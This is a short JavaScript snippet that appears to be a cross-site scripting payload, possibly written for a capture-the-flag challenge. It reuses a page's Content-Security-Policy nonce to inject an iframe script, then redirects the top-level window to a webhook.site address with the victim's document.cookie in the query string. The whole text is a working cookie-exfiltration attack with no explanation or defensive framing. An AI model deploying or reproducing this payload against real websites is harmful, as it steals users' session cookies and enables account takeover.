var nonce = parent.document.querySelector('script').nonce;
var iframe = parent.document.createElement('iframe');
iframe.srcdoc = '<script nonce="' + nonce + '">parent.parent.location="https://webhook.site/c35e20ef-075e-4cc2-917b-22eda8f964a3?c="+parent.parent.document.cookie</script>';
parent.document.body.appendChild(iframe);
